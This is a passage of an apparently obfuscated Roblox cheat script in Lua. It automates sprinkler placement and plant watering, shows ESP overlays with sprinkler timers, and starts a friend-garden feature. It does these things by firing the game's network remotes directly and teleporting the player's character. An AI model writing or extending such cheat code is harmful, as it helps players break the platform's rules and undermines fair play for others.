			local G = Z.SprinklerPlacer.GetTargetPlant()
			if not G or typeof(G.position) ~= "Vector3" then
				return nil, "Selected target plant not found"
			end
			return G.position
		end
		if y == "Saved Position" then
			local G = h.sprinkler_place_saved_position
			local V = type(G) == "table" and Z.Farm.GetPlantArea(G.area) or nil
			local y = type(G) == "table" and tonumber(G.x) or nil
			local j = type(G) == "table" and tonumber(G.z) or nil
			if not V or not y or not j then
				return nil, "Copy a sprinkler position"
			end
			if math.abs(y) > V.Size.X / 2 or math.abs(j) > V.Size.Z / 2 then
				return nil, "Saved position is outside your farm"
			end
			return V.CFrame:PointToWorldSpace(Vector3.new(y, V.Size.Y / 2, j))
		end
		return nil, "Invalid placement mode"
	end,
	GetGridOpenPositionSprinklerPlacer = function(G, V, y)
		local j = Z.TotalControl.ResolveSprinklerPlaceModeTotalControl()
		local i = tostring(j or h.sprinkler_place_mode or W.UseDefault)
		local c = Z.ControlMode.RightCol
		if type(y) == "string" and y ~= "" then
			c = Z.ControlMode.BothCol
		elseif i == "Saved Position" then
			local G = h.sprinkler_place_saved_position
			local V = type(G) == "table" and Z.Farm.GetPlantArea(G.area) or nil
			local y = Z.FarmGrid.GetAreaSideFarmGrid(V, Z.Farm.GetPermanentCenterCFrame())
			c = y == Z.ControlMode.LeftCol and Z.ControlMode.LeftCol or Z.ControlMode.RightCol
		end
		local J = Z.FarmGrid.GetOpenSpotFarmGrid(G, c, function(G)
			if type(y) == "string" and (y ~= "" and G.areaName ~= y) then
				return false
			end
			return typeof(G.position) == "Vector3" and Z.SprinklerPlacer.IsPositionOpen(G.position, V)
		end)
		return J and J.position or nil
	end,
	GetPlacementPosition = function(G, V)
		local y, j, i = Z.SprinklerPlacer.GetBasePosition(V)
		if not y then
			return nil, j
		end
		local c = Z.TotalControl.ResolveSprinklerPlaceModeTotalControl()
		local J = tostring(c or h.sprinkler_place_mode or W.UseDefault)
		if J == "Saved Position" and Z.SprinklerPlacer.IsPositionOpen(y, G) then
			return y
		end
		local T = Z.SprinklerPlacer.GetGridOpenPositionSprinklerPlacer(y, G, i)
		if not T then
			return nil, "No open sprinkler position found"
		end
		return T
	end;
	GetCandidates = function()
		local G = {}
		local V = Z.TotalControl.ResolveSprinklerSelectionTotalControl()
		local y = V or h.sprinkler_place_selected
		local j, i = Z.SprinklerPlacer.GetPlacedCounts()
		local c = j
		local J
		local T = 0
		local d = Z.TotalControl.ResolveSprinklerReplaceNearExpiryTotalControl()
		if d == true or d == nil and h.sprinkler_replace_near_expiry_enabled == true then
			J, T = Z.SprinklerPlacer.GetActivePlacedCountsSprinklerPlacer()
		end
		if type(J) == "table" and ((tonumber(T) or 0)) > 0 then
			c = J
		end
		local u = 0
		local q = 0
		if type(y) ~= "table" then
			return G, c, i, u, q
		end
		for V, y in pairs(y) do
			if y ~= true or not Z.SprinklerPlacer.IsValidName(V) then
				continue
			end
			u += 1
			local i = Z.SprinklerPlacer.GetTargetAmount(V)
			local T = math.max(math.floor(tonumber(c[V]) or 0), 0)
			local d = math.max(i - T, 0)
			if type(J) == "table" then
				local G = math.max(math.floor(tonumber(j[V]) or 0), 0)
				d = math.min(d, math.max(i * 2 - G, 0))
			end
			if d <= 0 then
				continue
			end
			q += 1
			if Z.SprinklerPlacer.GetTool(V) then
				table.insert(G, {
					name = V;
					placed = T,
					target = i;
					remaining = d
				})
			end
		end
		return G, c, i, u, q
	end;
	PrepareTeleport = function(G, V)
		local y = Z.TotalControl.ResolveSprinklerTeleportTotalControl()
		local j = h.sprinkler_place_teleport == true
		if y ~= nil then
			j = y == true
		end
		if not j then
			return true
		end
		if not Z.PlayerData.GetIsInOwnGarden() then
			return Z.GameTeleport.Garden(V)
		end
		return false
	end,
	Place = function(G, V, j, i)
		if type(G) ~= "string" or G == "" then
			return false
		end
		if typeof(V) ~= "Vector3" or not j or not j:IsA("Tool") then
			return false
		end
		if not Z.Player.IsToolHeld(j) then
			return false
		end
		i = tonumber(i)
		if not i or i <= 0 then
			return false
		end
		local c = y.Networking and (y.Networking.Place and y.Networking.Place.PlaceSprinkler)
		if not c or type(c.Fire) ~= "function" then
			return false
		end
		local J = Z.SprinklerPlacer.GetPlacedCounts()
		local T = J[G] or 0
		local d = Z.SprinklerPlacer.GetToolCountSprinklerPlacer(j)
		if Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", G, d) then
			return false
		end
		local u = pcall(function()
			c:Fire(V, G, j, i)
		end)
		if not u then
			return false
		end
		local q = os.clock() + 1.5
		repeat
			local V = Z.SprinklerPlacer.GetPlacedCounts()
			local y = V[G] or 0
			if y > T then
				return true
			end
			if Z.SprinklerPlacer.GetToolCountSprinklerPlacer(j) < d then
				return true
			end
			if not j.Parent and d > 0 then
				return true
			end
			task.wait(.05)
		until os.clock() >= q
		return false
	end,
	Run = function()
		local G = Z.TotalControl.ResolveSprinklerPlacerEnabledTotalControl()
		local V = h.auto_sprinkler_place == true
		if G ~= nil then
			V = G == true
		end
		if not V then
			Z.SprinklerPlacer.ClearStatus()
			return 0
		end
		if not q.IsLoadingCompleted() then
			Z.SprinklerPlacer.SetStatus("Waiting for garden load", "#FFCC66")
			return 0
		end
		local y = Z.TotalControl.ResolveSprinklerWeatherAllowedTotalControl()
		local j, i = y == true, "Any Time"
		if y == nil then
			j, i = Z.WeatherTriggers.IsActiveWeatherTriggers(h.sprinkler_place_weather_enabled, h.sprinkler_place_weather_selected)
		end
		if not j then
			Z.SprinklerPlacer.SetStatus("Waiting for weather | Now: " .. tostring(i), "#CFCFCF")
			return 0
		end
		local c, J, T, d, u = Z.SprinklerPlacer.GetCandidates()
		if d <= 0 then
			Z.SprinklerPlacer.SetStatus("Paused: select sprinklers", "#FFCC66")
			return 0
		end
		if # c <= 0 then
			if u <= 0 then
				Z.SprinklerPlacer.SetStatus("All selected targets reached", "#7CFC00")
			else
				Z.SprinklerPlacer.SetStatus("Selected sprinkler tools not found", "#FFCC66")
			end
			return 0
		end
		local E = Z.SprinklerPlacer.GetOccupiedPositions()
		local a, H = Z.SprinklerPlacer.GetPlacementPosition(E, T)
		if not a then
			Z.SprinklerPlacer.SetStatus(H or "Placement position unavailable", "#FF5555")
			return 0
		end
		local r = Z.PlayerData.GetPlotId()
		if not r or r <= 0 then
			Z.SprinklerPlacer.SetStatus("Plot ID not found", "#FF5555")
			return 0
		end
		local Y = g.TeleportLockNames.SprinklerPlacer
		local e = false
		local s = Z.TotalControl.ResolveSprinklerTeleportTotalControl()
		local N = h.sprinkler_place_teleport == true
		if s ~= nil then
			N = s == true
		end
		if N then
			e = Z.Teleport.LockTeleport(Y, 10, false)
			if not e then
				Z.SprinklerPlacer.SetStatus("Waiting: teleport busy", "#FFCC66")
				return 0
			end
		end
		local W = 0
		local X = 0
		while V and (# c > 0 and X < Z.SprinklerPlacer.MaxPerLoop) do
			local G = Z.Farm._Random:NextInteger(1, # c)
			local V = c[G]
			local y = Z.SprinklerPlacer.GetTool(V.name)
			if not y or V.remaining <= 0 then
				table.remove(c, G)
				continue
			end
			local j, i = Z.SprinklerPlacer.GetPlacementPosition(E, T + W)
			if not j then
				Z.SprinklerPlacer.SetStatus(i or "Placement position unavailable", "#FF5555")
				break
			end
			if N then
				Z.Teleport.LockTeleport(Y, 10, false)
				if not Z.SprinklerPlacer.PrepareTeleport(j, Y) then
					Z.SprinklerPlacer.SetStatus("Could not reach placement position", "#FF5555")
					break
				end
			end
			if not Z.SprinklerPlacer.EquipTool(y) then
				table.remove(c, G)
				continue
			end
			X += 1
			Z.SprinklerPlacer.SetStatus(string.format("Placing %s %d/%d", V.name, V.placed + 1, V.target), "#66CCFF")
			local d = Z.SprinklerPlacer.Place(V.name, j, y, r)
			if d then
				table.insert(E, j)
				V.placed += 1
				V.remaining -= 1
				J[V.name] = V.placed
				W += 1
				task.wait(Z.SprinklerPlacer.GetDelay())
			else
				table.insert(E, j)
				if N then
					Z.SprinklerPlacer.SetStatus("Sprinkler placement failed", "#FF5555")
				else
					Z.SprinklerPlacer.SetStatus("Placement failed: try Auto Teleport", "#FFCC66")
				end
				task.wait(.05)
				continue
			end
			if V.remaining <= 0 then
				table.remove(c, G)
			end
		end
		Z.SprinklerPlacer.CleanupTool()
		if e then
			Z.Teleport.UnlockTeleport(Y)
		end
		if not V then
			Z.SprinklerPlacer.ClearStatus()
		elseif W > 0 then
			Z.SprinklerPlacer.SetStatus(string.format("Placed %d sprinkler%s | Waiting", W, W == 1 and "" or "s"), "#7CFC00")
		end
		return W
	end,
	Loop = function()
		local G = Z.TotalControl.ResolveSprinklerPlacerEnabledTotalControl()
		local V = h.auto_sprinkler_place == true
		if G ~= nil then
			V = G == true
		end
		if not V then
			Z.SprinklerPlacer.ClearStatus()
			return 0
		end
		if not g.GetCheckIfPro() then
			return 0
		end
		local y, j = pcall(Z.SprinklerPlacer.Run)
		if not y then
			Z.SprinklerPlacer.CleanupTool()
			Z.Teleport.UnlockTeleport(g.TeleportLockNames.SprinklerPlacer)
			Z.SprinklerPlacer.SetStatus("Error: sprinkler placer failed", "#FF4444")
			warn("[SprinklerPlacer] Loop error:", j)
			return 0
		end
		return tonumber(j) or 0
	end
}
Z.SprinklerTimeEsp = {
	StartedSprinklerTimeEsp = false,
	GetServerNowSprinklerTimeEsp = function()
		local G, V = pcall(function()
			return y.Workspace:GetServerTimeNow()
		end)
		if G and type(V) == "number" then
			return V
		end
		return os.time()
	end;
	FormatRemainingSprinklerTimeEsp = function(G)
		G = math.max(math.ceil(tonumber(G) or 0), 0)
		local V = math.floor(G / 31536000)
		G -= V * 31536000
		local y = math.floor(G / 86400)
		G -= y * 86400
		local Z = math.floor(G / 3600)
		G -= Z * 3600
		local j = math.floor(G / 60)
		local i = G % 60
		local c = {}
		if V > 0 then
			table.insert(c, tostring(V) .. "y")
		end
		if y > 0 then
			table.insert(c, tostring(y) .. "d")
		end
		if Z > 0 then
			table.insert(c, tostring(Z) .. "h")
		end
		if j > 0 then
			table.insert(c, tostring(j) .. "m")
		end
		if # c == 0 then
			return tostring(i) .. "s"
		end
		return table.concat(c, " ")
	end,
	ClearSprinklerTimeEsp = function()
		local G = Z.SprinklerPlacer.GetSprinklersFolder()
		if not G then
			return false
		end
		local V = false
		for G, y in ipairs(G:GetChildren()) do
			local Z = y:FindFirstChild("ExoSprinklerTimeEsp")
			if Z then
				Z:Destroy()
				V = true
			end
		end
		return V
	end,
	RefreshSprinklerTimeEsp = function()
		if h.sprinkler_time_esp_enabled ~= true then
			Z.SprinklerTimeEsp.ClearSprinklerTimeEsp()
			return false
		end
		local G = Z.SprinklerPlacer.GetSprinklersFolder()
		local V = y.GardenSyncController
		if not G or type(V) ~= "table" or type(V.GetSprinklers) ~= "function" then
			return false
		end
		local j, i = pcall(function()
			return V:GetSprinklers(g.player_userid)
		end)
		if not j or type(i) ~= "table" then
			return false
		end
		local c = Z.SprinklerTimeEsp.GetServerNowSprinklerTimeEsp()
		for G, V in ipairs(G:GetChildren()) do
			local y = nil
			if V:IsA("Model") then
				y = V.PrimaryPart or V:FindFirstChildWhichIsA("BasePart", true)
			elseif V:IsA("BasePart") then
				y = V
			end
			local j = V:FindFirstChild("ExoSprinklerTimeEsp")
			if not j then
				j = Instance.new("BillboardGui")
				j.Name = "ExoSprinklerTimeEsp"
				j.AlwaysOnTop = true
				j.LightInfluence = 0
				j.MaxDistance = 100000
				j.Size = UDim2.fromOffset(150, 42)
				j.StudsOffset = Vector3.new(0, 4.25, 0)
				j.Parent = V
				local G = Instance.new("TextLabel")
				G.Name = "Text"
				G.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				G.BackgroundTransparency = .35
				G.BorderSizePixel = 0
				G.Font = Enum.Font.GothamBold
				G.RichText = true
				G.Size = UDim2.fromScale(1, 1)
				G.TextColor3 = Color3.fromRGB(255, 255, 255)
				G.TextScaled = true
				G.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
				G.TextStrokeTransparency = .15
				G.Parent = j
			end
			j.Adornee = y
			j.Enabled = y ~= nil
			local J = tostring(V:GetAttribute("SprinklerId") or "")
			if J == "" then
				local G = (tostring(V.Name or "")):match("^[^_]+_(.+)$")
				J = tostring(G or "")
			end
			local T = i[J]
			local d = tonumber(J)
			if T == nil and d ~= nil then
				T = i[d]
			end
			local u = tostring(V:GetAttribute("SprinklerName") or "")
			local q = nil
			local g = nil
			if type(T) == "table" then
				u = tostring(T.SprinklerName or u)
				q = tonumber(T.Lifetime)
				g = tonumber(T.PlacedAt)
			end
			if not q then
				q = Z.SprinklerPlacer.GetLifetimeSprinklerPlacer(u)
			end
			local E = u
			if E == "" then
				E = "Sprinkler"
			end
			local a = j:FindFirstChild("Text")
			if a then
				if g and q then
					local G = math.max(((g + q)) - c, 0)
					local V = "#7CFC00"
					if G <= 10 then
						V = "#FF6666"
					elseif G <= 30 then
						V = "#FFCC66"
					end
					a.Text = string.format("<font color=\'#66CCFF\'>\240\159\146\166 %s</font>\n<font color=\'%s\'>\226\143\179 %s</font>", E, V, Z.SprinklerTimeEsp.FormatRemainingSprinklerTimeEsp(G))
				else
					a.Text = string.format("<font color=\'#66CCFF\'>\240\159\146\166 %s</font>\n<font color=\'#CFCFCF\'>Syncing...</font>", E)
				end
			end
		end
		return true
	end,
	StartSprinklerTimeEsp = function()
		if Z.SprinklerTimeEsp.StartedSprinklerTimeEsp then
			return false
		end
		Z.SprinklerTimeEsp.StartedSprinklerTimeEsp = true
		task.spawn(function()
			while not g.is_forced_stop do
				pcall(Z.SprinklerTimeEsp.RefreshSprinklerTimeEsp)
				task.wait(1)
			end
		end)
		return true
	end
}
Z.SprinklerTimeEsp.StartSprinklerTimeEsp()
g.WaterPlantStatusText = ""
Z.WaterPlants = {
	NextUseAt = 0,
	LastCanName = "",
	LastTargetName = "";
	EquippedBySystem = false,
	MovementLockSeconds = 60;
	SetStatus = function(G, V)
		g.WaterPlantStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\146\167 [Water Plants]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or "Waiting"))
	end,
	ClearStatus = function()
		g.WaterPlantStatusText = ""
	end,
	GetFarmMiddlePositionWaterPlants = function()
		local G = Z.Trowel.GetFarmMiddleRightPositionTrowel()
		local V = 5
		if typeof(G) ~= "Vector3" then
			return nil
		end
		local y, j, i = Z.Farm.ProjectPositionToPlantArea(G, 0)
		if not j or not j:IsA("BasePart") or typeof(i) ~= "Vector3" then
			return G
		end
		local c = math.clamp(i.X + V, - j.Size.X / 2, j.Size.X / 2)
		return j.CFrame:PointToWorldSpace(Vector3.new(c, j.Size.Y / 2, i.Z))
	end;
	GetDefaultPlacementPositionWaterPlants = function(G)
		local V, y, j = Z.Farm.GetPlacementPositionFarm(G)
		if j ~= W.Default then
			return V, j
		end
		return Z.WaterPlants.GetFarmMiddlePositionWaterPlants(), j
	end;
	GetCanDropdown = function()
		local G = {}
		if type(y.WateringcanData) ~= "table" then
			return G
		end
		for V, y in ipairs(y.WateringcanData) do
			local Z = type(y) == "table" and y.Name or nil
			if type(Z) ~= "string" or Z == "" then
				continue
			end
			local j = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#66CCFF\">%d studs</font> <font color=\"#FFD966\">\226\143\179%ds</font> <font color=\"#7CFC00\">Multi x%d</font>", tostring(Z), math.floor(tonumber(y.SplashRadius) or 0), math.floor(tonumber(y.EffectTime) or 0), math.floor(tonumber(y.GrowthSpeedMultiplier) or 0))
			table.insert(G, {
				Text = j,
				Value = Z
			})
		end
		return G
	end;
	GetTool = function()
		if type(y.WateringcanData) ~= "table" then
			return nil, nil
		end
		local G = Z.TotalControl.ResolveWaterPlantsSelectedCansTotalControl()
		local V = G or h.water_plant_selected_cans
		local j = type(V) ~= "table" or next(V) == nil
		local i = Z.Backpack.GetBackpackAllItems()
		for G, y in ipairs(y.WateringcanData) do
			local c = type(y) == "table" and y.Name or nil
			if type(c) ~= "string" or c == "" then
				continue
			end
			if not j and V[c] ~= true then
				continue
			end
			for G, V in ipairs(i) do
				if V:IsA("Tool") and V:GetAttribute("WateringCan") == c then
					local G = Z.StackKeepOverrides.GetToolCountStackKeepOverrides(V)
					if not Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", c, G) then
						return V, y
					end
				end
			end
		end
		return nil, nil
	end;
	GetPlantTarget = function(G, V)
		local y = Z.FruitFiltersDataSync
		if not y or type(y.GetPlantEntriesFruitFiltersDataSync) ~= "function" then
			return nil, nil
		end
		for y, j in ipairs(y.GetPlantEntriesFruitFiltersDataSync()) do
			local i = tostring(j.name or "")
			if i == "" then
				continue
			end
			if type(G) == "string" and (G ~= "" and i ~= G) then
				continue
			end
			if V and not Z.WaterPlants.IsPlantGrowing(j.data, j.physical) then
				continue
			end
			local c = Z.Seeder and (type(Z.Seeder.GetPlantPosition) == "function" and Z.Seeder.GetPlantPosition(j)) or j.position
			if typeof(c) ~= "Vector3" then
				continue
			end
			local J = Z.Farm.ProjectPositionToPlantArea(c, 0)
			if typeof(J) == "Vector3" then
				return J, i
			end
		end
		return nil, nil
	end;
	IsPlantGrowing = function(G, V)
		local y = Z.FruitFiltersDataSync
		if type(G) == "table" then
			local V = tonumber(G.Age or G.CurrentAge)
			local Z = tonumber(G.MaxAge)
			if y and type(y.IsPlantReady) == "function" then
				local V, j = pcall(y.IsPlantReady, G)
				if V then
					return j ~= true and (Z and Z > 0)
				end
			end
			if V and (Z and Z > 0) then
				return V < Z
			end
		end
		if typeof(V) == "Instance" and V.Parent then
			local G = tonumber(V:GetAttribute("Age") or V:GetAttribute("CurrentAge"))
			local y = tonumber(V:GetAttribute("MaxAge"))
			return G and (y and (y > 0 and G < y)) or false
		end
		return false
	end,
	GetTargetPosition = function()
		local G = Z.TotalControl.ResolveWaterPlantsModeTotalControl()
		local V = tostring(G or h.water_plant_mode or "Growing Plant")
		if V == "Growing Plant" then
			local G, V = Z.WaterPlants.GetPlantTarget(nil, true)
			if typeof(G) ~= "Vector3" then
				return nil, nil, "No growing plants"
			end
			return G, V
		end
		if Z.Farm.IsPlacementModeFarm(V) then
			local G, y = Z.WaterPlants.GetDefaultPlacementPositionWaterPlants(V)
			if typeof(G) ~= "Vector3" then
				return nil, nil, tostring(y or "Farm position") .. " not found"
			end
			return G, y
		end
		if V == "Plant Target" then
			local G = tostring(h.water_plant_target_plant or "")
			if G == "" then
				return nil, nil, "Select a target plant"
			end
			local V = Z.WaterPlants.GetPlantTarget(G, false)
			if typeof(V) ~= "Vector3" then
				return nil, nil, G .. " not found"
			end
			return V, G
		end
		if V == "Custom Position" then
			local G = h.water_plant_saved_position
			local V = type(G) == "table" and Z.Farm.GetPlantArea(G.area) or nil
			local y = type(G) == "table" and tonumber(G.x) or nil
			local j = type(G) == "table" and tonumber(G.z) or nil
			if not V or not y or not j then
				return nil, nil, "Copy a custom position"
			end
			if math.abs(y) > V.Size.X / 2 or math.abs(j) > V.Size.Z / 2 then
				return nil, nil, "Custom position is outside your farm"
			end
			local i = V.CFrame:PointToWorldSpace(Vector3.new(y, V.Size.Y / 2, j))
			return i, "Custom Position"
		end
		return nil, nil, "Invalid watering mode"
	end,
	SaveCurrentPosition = function()
		local G = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		if not G then
			return false, "Character not found"
		end
		local V, j = Z.Farm.GetPlantAreaAtPosition(G.Position)
		if not V or typeof(j) ~= "Vector3" then
			return false, "Stand inside your farm"
		end
		h.water_plant_saved_position = {
			area = V.Name,
			x = j.X;
			z = j.Z
		}
		a.Save.SaveDataSync()
		return true, "Watering position saved"
	end;
	GetSavedPositionText = function()
		local G = h.water_plant_saved_position
		local V = type(G) == "table" and tostring(G.area or "") or ""
		local y = type(G) == "table" and tonumber(G.x) or nil
		local Z = type(G) == "table" and tonumber(G.z) or nil
		if V == "" or not y or not Z then
			return "\240\159\147\141 Custom Position: Not set"
		end
		return string.format("\240\159\147\141 Custom Position: %s | X %.2f | Z %.2f", V, y, Z)
	end,
	EnsureNearTarget = function(G)
		if typeof(G) ~= "Vector3" then
			return false, false, "Invalid watering position"
		end
		local V = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		if not V then
			return false, false, "Character not found"
		end
		local j = g.TeleportLockNames.WaterPlants
		if h.garden_items_use_player_walk == true then
			local y = 30
			if Z.Movement.Distance2D(V.Position, G) <= y then
				return true, false
			end
			local i = Z.Movement.Timeout
			if not Z.Teleport.LockTeleport(j, Z.WaterPlants.MovementLockSeconds, true) then
				return false, false, "Waiting: movement busy"
			end
			Z.WaterPlants.SetStatus("Walking to watering target...", "#66CCFF")
			local c = Z.Movement.MoveLikePlayerToPoint(G, i, nil, y)
			if not c then
				Z.Teleport.UnlockTeleport(j)
				return false, false, "Could not reach watering target"
			end
			return true, true
		end
		if ((V.Position - G)).Magnitude <= 21 then
			return true, false
		end
		if not Z.Teleport.LockTeleport(j, 4, false) then
			return false, false, "Waiting: teleport busy"
		end
		Z.WaterPlants.SetStatus("Moving near watering target...", "#66CCFF")
		local i = Vector3.new(V.Position.X - G.X, 0, V.Position.Z - G.Z)
		if i.Magnitude <= .1 then
			i = Vector3.new(0, 0, 1)
		else
			i = i.Unit
		end
		local c = (G + i * 6) + Vector3.new(0, 3, 0)
		local J = Z.Teleport.TeleportToCFrame(CFrame.lookAt(c, G), j)
		if not J then
			Z.Teleport.UnlockTeleport(j)
			return false, false, "Could not reach watering target"
		end
		task.wait(.15)
		return true, true
	end;
	CleanupTool = function()
		if Z.WaterPlants.EquippedBySystem then
			Z.WaterPlants.EquippedBySystem = false
			Z.Player.UnequipTools()
		end
	end;
	Use = function(G, V, j)
		local i = y.Networking and (y.Networking.WateringCan and y.Networking.WateringCan.UseWateringCan)
		if typeof(G) ~= "Vector3" or type(V) ~= "string" or V == "" then
			return false
		end
		if not j or not j:IsA("Tool") or not Z.Player.IsToolHeld(j) then
			return false
		end
		if not i or type(i.Fire) ~= "function" then
			return false
		end
		return pcall(function()
			i:Fire(G - Vector3.new(0, .3, 0), V, j)
		end)
	end;
	Run = function()
		local G = Z.TotalControl.ResolveWaterPlantsEnabledTotalControl()
		local V = h.auto_water_plants == true
		if G ~= nil then
			V = G == true
		end
		if not V then
			Z.WaterPlants.ClearStatus()
			return 0
		end
		local j = Z.TotalControl.ResolveWaterPlantsWeatherAllowedTotalControl()
		local i, c = j == true, "Any Time"
		if j == nil then
			i, c = Z.WeatherTriggers.IsActiveWeatherTriggers(h.water_plant_weather_enabled, h.water_plant_weather_selected)
		end
		if not i then
			Z.WaterPlants.SetStatus("Waiting for weather | Now: " .. tostring(c), "#CFCFCF")
			return 0
		end
		if type(y.WateringcanData) ~= "table" then
			Z.WaterPlants.SetStatus("Watering data unavailable", "#FF5555")
			return 0
		end
		local J = Z.TotalControl.ResolveWaterPlantsWaitEffectTotalControl()
		local T = h.water_plant_wait_effect == true
		if J ~= nil then
			T = J == true
		end
		if T then
			local G = math.max(math.ceil(Z.WaterPlants.NextUseAt - os.clock()), 0)
			if G > 0 then
				Z.WaterPlants.SetStatus(string.format("%s \226\134\146 %s | Wait %ds", Z.WaterPlants.LastCanName, Z.WaterPlants.LastTargetName, G), "#7CFC00")
				return 0
			end
		else
			local G = math.max(tonumber(h.water_plant_delay) or 0, 0)
			if G > 0 then
				local G = math.max(math.ceil(Z.WaterPlants.NextUseAt - os.clock()), 0)
				if G > 0 then
					Z.WaterPlants.SetStatus(string.format("%s \226\134\146 %s | Delay %ds", Z.WaterPlants.LastCanName, Z.WaterPlants.LastTargetName, G), "#7CFC00")
					return 0
				end
			end
		end
		local d, u, q = Z.WaterPlants.GetTargetPosition()
		if typeof(d) ~= "Vector3" then
			Z.WaterPlants.SetStatus(q or "Target not found", "#CFCFCF")
			return 0
		end
		local E, a = Z.WaterPlants.GetTool()
		if not E or type(a) ~= "table" then
			Z.WaterPlants.SetStatus("Watering can not found", "#FFCC66")
			return 0
		end
		local H = tostring(a.Name or "")
		if H == "" then
			Z.WaterPlants.SetStatus("Invalid watering can", "#FF5555")
			return 0
		end
		local r = Z.StackKeepOverrides.GetToolCountStackKeepOverrides(E)
		if Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", H, r) then
			Z.WaterPlants.SetStatus("Watering can not found", "#FFCC66")
			return 0
		end
		local Y, e, s = Z.WaterPlants.EnsureNearTarget(d)
		if not Y then
			Z.WaterPlants.SetStatus(s or "Could not reach target", "#FFCC66")
			return 0
		end
		if not Z.Player.IsToolHeld(E) then
			Z.Player.UnequipTools()
			if not Z.Player.EquipTool(E) then
				if e then
					Z.Teleport.UnlockTeleport(g.TeleportLockNames.WaterPlants)
				end
				Z.WaterPlants.SetStatus("Could not equip watering can", "#FF5555")
				return 0
			end
			Z.WaterPlants.EquippedBySystem = true
			task.wait(.15)
		end
		if not Z.Player.IsToolHeld(E) then
			Z.WaterPlants.CleanupTool()
			if e then
				Z.Teleport.UnlockTeleport(g.TeleportLockNames.WaterPlants)
			end
			Z.WaterPlants.SetStatus("Watering can was unequipped", "#FF5555")
			return 0
		end
		Z.WaterPlants.SetStatus("Watering " .. (tostring(u or "target") .. "..."), "#66CCFF")
		local N = Z.WaterPlants.Use(d, H, E)
		task.wait(.15)
		Z.WaterPlants.CleanupTool()
		if e then
			Z.Teleport.UnlockTeleport(g.TeleportLockNames.WaterPlants)
		end
		if not N then
			Z.WaterPlants.SetStatus("Watering failed", "#FF5555")
			return 0
		end
		local W = math.max(math.floor(tonumber(a.EffectTime) or 1), 1)
		Z.WaterPlants.LastCanName = H
		Z.WaterPlants.LastTargetName = tostring(u or "Target")
		if T then
			Z.WaterPlants.NextUseAt = os.clock() + W
			Z.WaterPlants.SetStatus(string.format("%s \226\134\146 %s | Wait %ds", H, Z.WaterPlants.LastTargetName, W), "#7CFC00")
		else
			local G = math.max(tonumber(h.water_plant_delay) or 0, 0)
			if G > 0 then
				Z.WaterPlants.NextUseAt = os.clock() + G
				Z.WaterPlants.SetStatus(string.format("%s \226\134\146 %s | Delay %gs", H, Z.WaterPlants.LastTargetName, G), "#7CFC00")
			else
				Z.WaterPlants.NextUseAt = 0
				Z.WaterPlants.SetStatus(string.format("%s \226\134\146 %s | Stacking", H, Z.WaterPlants.LastTargetName), "#7CFC00")
			end
		end
		return 1
	end,
	Loop = function()
		local G = Z.TotalControl.ResolveWaterPlantsEnabledTotalControl()
		local V = h.auto_water_plants == true
		if G ~= nil then
			V = G == true
		end
		if not V then
			Z.WaterPlants.ClearStatus()
			return 0
		end
		local y, j = pcall(Z.WaterPlants.Run)
		if not y then
			Z.WaterPlants.CleanupTool()
			Z.Teleport.UnlockTeleport(g.TeleportLockNames.WaterPlants)
			Z.WaterPlants.SetStatus("Error: watering loop failed", "#FF4444")
			warn("[WaterPlants] Loop error:", j)
			return 0
		end
		return tonumber(j) or 0
	end
}
g.FriendGardenCareStatusText = ""
g.FriendGardenCareUi = g.FriendGardenCareUi or {}
Z.FriendGardenCare = {
	BusyFriendGardenCare = false,
	EquippedBySystemFriendGardenCare = false,
	RejoinRequestedAtFriendGardenCare = 0;
	ProgressByFriendFriendGardenCare = {};
	FriendNamesFriendGardenCare = {};
	SpeedPetStateFriendGardenCare = nil;
	SetStatusFriendGardenCare = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.FriendGardenCareStatusText = ""
			return false
		end
		g.FriendGardenCareStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\146\167 [Friend Garden]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	ClearStatusFriendGardenCare = function()
		g.FriendGardenCareStatusText = ""
	end;
	GetSelectionValuesFriendGardenCare = function(G)
		local V = {}
		local y = {}
		if type(G) ~= "table" then
			return V
		end
		for G, Z in pairs(G) do
			local j = ""
			if type(G) == "number" then
				j = tostring(Z or "")
			elseif Z ~= nil and Z ~= false then
				j = tostring(G or "")
			end
			j = j:match("^%s*(.-)%s*$") or ""
			if j ~= "" and not y[j] then
				y[j] = true
				table.insert(V, j)
			end
		end
		table.sort(V)
		return V
	end,
	IsSelectedFriendGardenCare = function(G, V)
		V = tostring(V or "")
		if V == "" then
			return false
		end
		for G, y in ipairs(Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(G)) do
			if y == V then
				return true
			end
		end
		return false
	end,
	GetDelayFriendGardenCare = function()
		return math.max(tonumber(h.friend_garden_care_placement_delay) or .15, .001)
	end;
	GetPlayerDropdownTextFriendGardenCare = function(G, V)
		G = tostring(G or "")
		V = tostring(V or "Saved player")
		local Z = y.Players:GetPlayerByUserId(tonumber(G) or 0)
		if Z and Z ~= y.LocalPlayer then
			V = tostring(Z.Name or V)
			return string.format("\240\159\159\162 <font color=\'#7CFC00\'>Online</font> | %s <font color=\'#888888\'>(%s)</font>", V, G)
		end
		return string.format("\240\159\148\180 <font color=\'#FF6666\'>Offline</font> | %s <font color=\'#888888\'>(%s)</font>", V, G)
	end;
	GetSavedFriendDropdownFriendGardenCare = function()
		local G = {}
		for V, y in ipairs(Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_friends)) do
			local j = tostring(Z.FriendGardenCare.FriendNamesFriendGardenCare[y] or "Saved player")
			table.insert(G, {
				Text = Z.FriendGardenCare.GetPlayerDropdownTextFriendGardenCare(y, j);
				Value = y
			})
		end
		return G
	end,
	FetchFriendDropdownFriendGardenCare = function()
		local G = {}
		local V = {}
		for j, i in ipairs(y.Players:GetPlayers()) do
			if i ~= y.LocalPlayer then
				local y = tostring(i.UserId or "")
				local j = tostring(i.Name or "Player")
				if y ~= "" and not V[y] then
					V[y] = true
